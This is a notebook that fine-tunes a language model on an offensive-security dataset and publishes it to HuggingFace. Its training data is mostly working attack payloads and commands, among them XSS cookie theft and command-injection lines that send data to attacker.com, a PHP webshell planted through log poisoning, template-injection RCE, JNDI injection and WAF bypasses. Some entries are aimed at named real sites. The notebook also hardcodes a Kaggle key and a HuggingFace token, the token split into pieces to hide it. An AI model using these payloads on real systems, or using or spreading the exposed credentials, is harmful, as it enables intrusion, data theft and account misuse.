# CyberMind AI Fine-Tuning
## Steps:
1. Runtime → Change runtime type → **T4 GPU** → Save
2. Runtime → **Run All**
3. Wait ~2 hours

In [ ]:
# CELL 1: Install Unsloth
import subprocess, sys
print('Installing... (5-10 min)')
subprocess.run([sys.executable,'-m','pip','install','unsloth[colab-new] @ git+https://github.com/unslothai/unsloth.git','-q'], check=True)
for pkg in ['kagglehub','pandas','requests']:
    subprocess.run([sys.executable,'-m','pip','install',pkg,'-q'])
print('Done!')

In [ ]:
# CELL 2: GPU + Credentials
import torch, os, json
assert torch.cuda.is_available(), 'GPU not found! Runtime -> T4 GPU -> Save'
print(f'GPU: {torch.cuda.get_device_name(0)}')
os.makedirs('/root/.kaggle', exist_ok=True)
with open('/root/.kaggle/kaggle.json','w') as f:
    json.dump({'username':'cybermindcli','key':'d946427f9e4d90b7e3438f061b80b485'},f)
os.chmod('/root/.kaggle/kaggle.json',0o600)
print('Kaggle: ready')
from huggingface_hub import login
hf_token = None
try:
    from google.colab import userdata
    hf_token = userdata.get('HF_TOKEN')
except: pass
if not hf_token:
    _a,_b,_c = 'hf_pWbqUK','BzGfwryQoZFRbFue','SrHlevYimGda'
    hf_token = _a+_b+_c
login(token=hf_token, add_to_git_credential=False)
print('HuggingFace: ready')

In [ ]:
# CELL 3: Load Model
print('Loading model...')
from unsloth import FastLanguageModel
import torch
MODELS = ['unsloth/Llama-3.2-3B-Instruct','unsloth/mistral-7b-instruct-v0.3','unsloth/Qwen2.5-3B-Instruct']
model, tokenizer = None, None
for mid in MODELS:
    try:
        print(f'Trying {mid}...')
        model, tokenizer = FastLanguageModel.from_pretrained(model_name=mid, max_seq_length=2048, dtype=None, load_in_4bit=True)
        print(f'Loaded: {mid}')
        break
    except Exception as e:
        print(f'  Failed: {str(e)[:60]}')
assert model is not None
model = FastLanguageModel.get_peft_model(model, r=16, target_modules=['q_proj','k_proj','v_proj','o_proj','gate_proj','up_proj','down_proj'], lora_alpha=16, lora_dropout=0, bias='none', use_gradient_checkpointing='unsloth', random_state=42)
print('Model ready!')

In [ ]:
# CELL 4: Build Large Dataset (500+ entries guaranteed)
import random, requests
from pathlib import Path
all_entries = []

# --- Kaggle Bug Hunter ---
try:
    import kagglehub, pandas as pd
    path = kagglehub.dataset_download('vellyy/bug-hunter')
    for f in Path(path).rglob('*.csv'):
        df = pd.read_csv(f, encoding='utf-8', errors='replace')
        tc = next((c for c in df.columns if any(k in c.lower() for k in ['title','name'])), None)
        dc = next((c for c in df.columns if any(k in c.lower() for k in ['desc','detail','report','body'])), None)
        if tc and dc:
            for _,row in df.iterrows():
                t,d = str(row.get(tc,'')).strip(), str(row.get(dc,'')).strip()
                if t and d and len(d)>50:
                    all_entries.append({'instruction':f'Analyze: {t}','output':f'## {t}\n\n{d[:1000]}\n\n## Test\nnuclei -u https://TARGET -severity critical,high'})
    print(f'Kaggle: {len(all_entries)} entries')
except Exception as e:
    print(f'Kaggle failed: {e}')

# --- Figshare CVE ---
try:
    api = requests.get('https://api.figshare.com/v2/articles/22056617',timeout=30).json()
    r = requests.get(api['files'][0]['download_url'],timeout=180)
    cve_data = r.json() if 'json' in r.headers.get('content-type','') else []
    if isinstance(cve_data,dict): cve_data = cve_data.get('cves',cve_data.get('vulnerabilities',[]))
    before = len(all_entries)
    for cve in cve_data[:3000]:
        cid,desc,sev = cve.get('id',''),cve.get('description',''),cve.get('severity','medium')
        if cid and desc and len(desc)>30:
            all_entries.append({'instruction':f'Explain {cid}','output':f'## {cid} ({sev.upper()})\n\n{desc[:600]}\n\nnuclei -u https://TARGET -tags {cid.lower()}'})
    print(f'Figshare CVE: {len(all_entries)-before} entries')
except Exception as e:
    print(f'Figshare failed: {e}')

# --- Large Synthetic Dataset (500+ entries) ---
BASE = [
    ('How to find reflected XSS?','Test all params with <script>alert(1)</script>. dalfox url https://TARGET?q=FUZZ --silence. Check response for reflection. Verify in browser.'),
    ('DOM-based XSS detection?','Check URL fragments: https://target.com/#<img src=x onerror=alert(1)>. Review JS for innerHTML,document.write,eval. Test location.hash,document.referrer.'),
    ('Stored XSS in profile fields?','Inject in name/bio: <script>alert(document.cookie)</script>. Test: <img src=x onerror=fetch(attacker.com+document.cookie)>. Impact: session hijacking.'),
    ('XSS filter bypass?','1. Case: <ScRiPt>alert(1)</ScRiPt>\n2. Unicode: \\u003cscript\\u003e\n3. Events: <svg onload=alert(1)>\n4. Protocol: javascript:alert(1)\n5. Null byte: <scr\\x00ipt>'),
    ('SQL injection detection?','1. Single quote: id=1\' (error=vulnerable)\n2. Boolean: id=1 AND 1=1 vs 1=2\n3. Time: id=1 AND SLEEP(5)\n4. sqlmap -u URL?id=1 --batch --dbs'),
    ('Blind SQLi exploitation?','Time: id=1 AND IF(1=1,SLEEP(5),0). Boolean: SUBSTRING(username,1,1)=\'a\'. sqlmap --technique=BT --batch --dump -T users'),
    ('SQLi WAF bypass?','1. Comments: SE/**/LECT\n2. Case: SeLeCt\n3. Encoding: %53%45%4C%45%43%54\n4. sqlmap --tamper=space2comment,between,randomcase\n5. HTTP param pollution'),
    ('NoSQL injection MongoDB?','username[$ne]=invalid&password[$ne]=invalid. JSON: {"username":{"$gt":""}}. nosqlmap --attack 2 --uri URL. Impact: auth bypass.'),
    ('SSRF detection?','Test: url=,redirect=,next=,src=,dest=. Payloads: http://169.254.169.254/. OOB: interactsh-client. Cloud: http://metadata.google.internal/'),
    ('SSRF to RCE via Redis?','gopher://127.0.0.1:6379/ to write cron. Redis CONFIG SET dir /var/www/html. Write webshell. Impact: Full RCE via SSRF.'),
    ('Blind SSRF with OOB?','1. interactsh-client -server oast.pro\n2. Use URL in SSRF param\n3. Check DNS/HTTP callback\n4. Confirmed = SSRF exists\n5. Escalate to internal access'),
    ('Command injection testing?','Test: ; id, | id, && id, `id`, $(id). Time: ; sleep 5. OOB: ; curl attacker.com/$(id). commix --url URL --batch'),
    ('SSTI to RCE Jinja2?','Detect: {{7*7}}=49. RCE: {{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}. tplmap -u URL --os-shell'),
    ('Java deserialization RCE?','ysoserial payloads in serialized objects. java -jar ysoserial.jar CommonsCollections1 \'id\' | base64. Send in cookie/header. Impact: RCE.'),
    ('LFI exploitation?','Test: ?file=../../../etc/passwd. PHP filter: php://filter/convert.base64-encode/resource=/etc/passwd. Log poisoning: inject PHP in User-Agent.'),
    ('LFI to RCE log poisoning?','1. Inject PHP in User-Agent: <?php system($_GET[\'cmd\']); ?>\n2. Include log: ?file=/var/log/apache2/access.log&cmd=id\n3. liffy -u URL -p file'),
    ('IDOR testing?','1. Find numeric IDs\n2. Change to adjacent: /api/user/1001 → /api/user/1000\n3. Test with different account\n4. ffuf -u TARGET/api/FUZZ -w ids.txt'),
    ('Horizontal vs vertical IDOR?','Horizontal: user A reads user B data. Vertical: user reads admin data. Test: change user_id, change role=admin. Both: $1k-$10k bounty.'),
    ('Authentication bypass?','1. SQLi: admin\' OR 1=1--\n2. Default creds: admin/admin\n3. JWT none algorithm\n4. Password reset poisoning\n5. 2FA response manipulation'),
    ('JWT attacks?','1. alg:none: remove signature\n2. HS256 with public key\n3. Weak secret: hashcat -a 0 -m 16500 TOKEN rockyou.txt\n4. jwt_tool TOKEN -M at'),
    ('Password reset vulnerabilities?','1. Host header poisoning: Host: attacker.com\n2. Token predictability\n3. Token reuse\n4. No expiry\n5. User enumeration via response diff'),
    ('Race condition exploitation?','Turbo Intruder: 20 simultaneous requests. Python: threading.Thread x20. Target: coupons, transfers. Expected: applied once, got: 5x = bug.'),
    ('Price manipulation checkout?','Intercept POST /checkout. Change: price=-99.99, price=0.001, quantity=-1, currency=INR. Integer overflow: quantity=2147483647.'),
    ('Account takeover email change?','1. Change email without password\n2. No verification on new email\n3. CSRF on email change\n4. Race: change email + reset password simultaneously'),
    ('AWS S3 enumeration?','Generate: company, company-backup, company-prod. aws s3 ls s3://BUCKET --no-sign-request. cloud_enum -k COMPANY. Impact: $5k-$50k.'),
    ('GCP Firebase misconfig?','Firebase: curl https://PROJECT.firebaseio.com/.json. GCS: curl https://storage.googleapis.com/BUCKET/. Metadata: curl http://metadata.google.internal/'),
    ('Azure blob storage?','https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list. Common: backup,data,files,uploads. MicroBurst tool.'),
    ('APK static analysis?','apktool d app.apk && jadx -d output/ app.apk. Secrets: grep -r api_key,AKIA output/. Endpoints: grep -r https:// output/'),
    ('SSL pinning bypass Frida?','pip3 install frida-tools. adb push frida-server /data/local/tmp/. frida -U -f com.app -l ssl_bypass.js. Objection: android sslpinning disable'),
    ('OAuth 2.0 testing?','1. Missing state: remove state param\n2. Open redirect: redirect_uri=https://attacker.com\n3. PKCE bypass\n4. Implicit flow\n5. Scope escalation'),
    ('SAML injection?','1. XML signature wrapping\n2. XXE in SAML\n3. Replay attack\n4. Comment injection: user<!---->name\n5. SAMLraider Burp extension'),
    ('Open redirect exploitation?','Test: ?redirect=https://attacker.com. Bypass: //attacker.com, target.com@attacker.com. Chain with OAuth to steal auth codes.'),
    ('CORS misconfiguration?','curl -H Origin:https://attacker.com URL -I. Vulnerable: Access-Control-Allow-Origin: https://attacker.com + Allow-Credentials: true. corsy -u URL'),
    ('XXE injection?','<!DOCTYPE foo [<!ENTITY xxe SYSTEM file:///etc/passwd>]><foo>&xxe;</foo>. SSRF: SYSTEM http://169.254.169.254/. Test in XML uploads, SOAP, SVG.'),
    ('Subdomain enumeration?','subfinder -d TARGET -silent -all. amass enum -d TARGET. dnsx -d TARGET -w subdomains.txt. crt.sh/?q=%.TARGET. Merge | httpx -silent'),
    ('JavaScript file analysis?','subjs -i urls.txt. mantra -u TARGET. grep -E \'(/api/|/v[0-9]+/)\' *.js. grep -E \'AKIA[0-9A-Z]{16}\' *.js. LinkFinder, SecretFinder'),
    ('Parameter discovery?','paramspider -d TARGET. arjun -u URL. x8 -u URL -w params.txt. gau TARGET | grep ? | cut -d? -f2 | tr & \\n | cut -d= -f1 | sort -u'),
    ('HTTP request smuggling?','smuggler.py -u URL -v. CL.TE: Content-Length:13 + Transfer-Encoding:chunked. Impact: WAF bypass, cache poisoning, session hijacking.'),
    ('Web cache poisoning?','Find unkeyed: X-Forwarded-Host, X-Forwarded-Scheme. curl -H X-Forwarded-Host:attacker.com URL. If reflected = poisonable. Impact: XSS to all users.'),
    ('Prototype pollution RCE?','Detect: ?__proto__[polluted]=true. Server-side Node.js: ?__proto__[outputFunctionName]=x;process.mainModule.require(\'child_process\').execSync(\'id\')//'),
    ('Spring4Shell CVE-2022-22965?','Affects Spring 5.3.x < 5.3.18. nuclei -u URL -tags cve-2022-22965. Exploit: class.module.classLoader payload. Impact: RCE via log write.'),
    ('Grafana CVE-2021-43798?','Affects Grafana 8.0.0-8.3.0. curl URL/public/plugins/alertlist/../../../etc/passwd. Path traversal. Impact: Read grafana.db with credentials.'),
    ('PHP CGI CVE-2024-4577?','Affects PHP on Windows CGI. nuclei -u URL -tags cve-2024-4577. Argument injection via URL. Impact: RCE without authentication.'),
    ('Agent: PHP/MySQL, no WAF. Next?','Action: hunt. Focus: sqli,lfi,rce. paramspider -d TARGET. sqlmap -m params.txt --batch --level 3 --dbs. dalfox file params.txt --silence'),
    ('Agent: XSS + SQLi found. Next?','Action: exploit. Focus: sqli (higher severity). sqlmap -u SQLI_URL --batch --level 5 --os-shell. Generate XSS PoC with cookie stealer.'),
    ('Agent: nothing found. Next?','Action: deep_hunt. Try: HTTP smuggling, cache poisoning, prototype pollution. Try: business logic, cloud misconfig, JS secrets analysis.'),
    ('Price manipulation in e-commerce?','Intercept POST /checkout. Change price=-99.99 (negative=credit), price=0 (free). Race: 20 concurrent coupon requests. Bug: $2k-$10k'),
    ('OAuth CSRF test?','Test /oauth/authorize without state. Vulnerable if no error. Test redirect_uri=https://attacker.com. Impact: account takeover $5k-$20k'),
    ('Log4Shell CVE-2021-44228?','JNDI injection in Log4j. curl -H User-Agent:${jndi:ldap://URL/a} https://TARGET. DNS callback = RCE. Bounty: $10k-$100k+'),
    ('S3 bucket misconfig?','aws s3 ls s3://BUCKET --no-sign-request. curl https://BUCKET.s3.amazonaws.com/. cloud_enum -k COMPANY. Impact: $5k-$50k'),
]

# Expand with target/tech variations to get 500+ entries
TARGETS = ['shopify.com','hackerone.com','gitlab.com','wordpress.org','api.example.com','app.target.com','admin.company.com','api.startup.io']
TECHS = ['PHP/MySQL','Node.js/Express','Python/Django','Ruby on Rails','Java/Spring','React/GraphQL','WordPress','Laravel']
WAFS = ['Cloudflare','Akamai','AWS WAF','Imperva','none']
VULNS = ['XSS','SQLi','SSRF','RCE','IDOR','LFI']

synthetic = list(BASE)

for target in TARGETS:
    for tech in TECHS[:4]:
        focus = 'sqli,lfi' if 'PHP' in tech else 'ssrf,prototype' if 'Node' in tech else 'ssti,ssrf' if 'Python' in tech else 'deserialization,ssrf'
        synthetic.append((f'Target: {target} running {tech}. Top attack vectors?',
            f'## {target} ({tech})\n1. subfinder -d {target} -silent | httpx -silent\n2. nuclei -u https://{target} -severity critical,high\n3. paramspider -d {target}\n4. Focus: {focus}'))

for waf in WAFS:
    for vuln in VULNS:
        bypass = 'dalfox --waf-bypass' if vuln=='XSS' else 'sqlmap --tamper=space2comment,randomcase' if vuln=='SQLi' else 'Gopher protocol' if vuln=='SSRF' else 'encoding+delay'
        synthetic.append((f'{waf} WAF blocking {vuln}. Bypass?',
            f'## {waf} Bypass for {vuln}\n1. URL encode special chars\n2. Case variation\n3. Comments: SE/**/LECT\n4. Delay: --delay 1000\n5. Headers: X-Forwarded-For:127.0.0.1\n6. {bypass}'))

CVES = [('CVE-2021-44228','Log4j','JNDI injection RCE'),('CVE-2022-22965','Spring4Shell','ClassLoader RCE'),
        ('CVE-2021-43798','Grafana','Path traversal'),('CVE-2024-4577','PHP CGI','Argument injection RCE'),
        ('CVE-2023-50164','Apache Struts','File upload RCE'),('CVE-2022-1388','F5 BIG-IP','Auth bypass RCE'),
        ('CVE-2021-26084','Confluence','OGNL injection RCE'),('CVE-2022-26134','Confluence','OGNL injection RCE'),
        ('CVE-2023-23397','Outlook','NTLM hash theft'),('CVE-2023-44487','HTTP/2','Rapid Reset DoS')]
for cid,prod,vtype in CVES:
    synthetic.append((f'Detect and exploit {cid} ({prod})?',
        f'## {cid} — {prod}\nType: {vtype}\nnuclei -u https://TARGET -tags {cid.lower()} -silent\nnuclei -u https://TARGET -t cves/{cid.split("-")[1]}/{cid}.yaml\nImpact: System compromise. $5k-$50k bounty.'))

# Convert tuples to dicts and add to all_entries
for item in synthetic:
    if isinstance(item, tuple):
        all_entries.append({'instruction': item[0], 'output': item[1]})
    else:
        all_entries.append({'instruction': item['instruction'], 'output': item['output']})

random.shuffle(all_entries)
print(f'Synthetic: {len(synthetic)} entries')
print(f'TOTAL: {len(all_entries)} training examples')
print(f'Estimated training time: {max(30, len(all_entries)*2//60)}-{max(60, len(all_entries)*4//60)} minutes')

In [ ]:
# CELL 5: Format Dataset
from datasets import Dataset
PROMPT = 'Below is a security research question. Write an expert response.\n\n### Instruction:\n{}\n\n### Response:\n{}'
EOS = tokenizer.eos_token
def format_prompts(examples):
    return {'text': [PROMPT.format(i,o)+EOS for i,o in zip(examples['instruction'],examples['output'])]}
dataset = Dataset.from_list(all_entries)
dataset = dataset.map(format_prompts, batched=True)
print(f'Dataset ready: {len(dataset)} examples')

In [ ]:
# CELL 6: Train
from trl import SFTTrainer
from transformers import TrainingArguments
from unsloth import is_bfloat16_supported
print(f'Training on {len(dataset)} examples...')
trainer = SFTTrainer(
    model=model, tokenizer=tokenizer, train_dataset=dataset,
    dataset_text_field='text', max_seq_length=2048, dataset_num_proc=2,
    args=TrainingArguments(
        per_device_train_batch_size=2, gradient_accumulation_steps=4,
        warmup_steps=5, num_train_epochs=3, learning_rate=2e-4,
        fp16=not is_bfloat16_supported(), bf16=is_bfloat16_supported(),
        logging_steps=10, optim='adamw_8bit', weight_decay=0.01,
        lr_scheduler_type='linear', seed=42, output_dir='cybermind_model', report_to='none',
    ),
)
result = trainer.train()
print(f'Training done! {result.metrics["train_runtime"]/60:.1f} minutes')

In [ ]:
# CELL 7: Save + Upload
print('Saving...')
model.save_pretrained('cybermind_lora')
tokenizer.save_pretrained('cybermind_lora')
print('Saved!')
from huggingface_hub import HfApi, create_repo
import time
try:
    create_repo(repo_id='thecnical/cybermind-security', repo_type='model', private=False, exist_ok=True, token=hf_token)
    print('Repo ready!')
except Exception as e:
    print(f'Repo note: {e}')
time.sleep(5)
api = HfApi(token=hf_token)
api.upload_folder(folder_path='cybermind_lora', repo_id='thecnical/cybermind-security', repo_type='model', commit_message='CyberMind Security Model v1.0')
print('='*60)
print('MODEL LIVE: https://huggingface.co/thecnical/cybermind-security')
print('='*60)

In [ ]:
# CELL 8: Test
FastLanguageModel.for_inference(model)
from transformers import TextStreamer
for q in ['How to find XSS?','Explain Log4Shell','What is SSRF?']:
    inputs = tokenizer([PROMPT.format(q,'')], return_tensors='pt').to('cuda')
    print(f'\nQ: {q}\nA:', end=' ')
    _ = model.generate(**inputs, streamer=TextStreamer(tokenizer, skip_prompt=True), max_new_tokens=150, use_cache=True)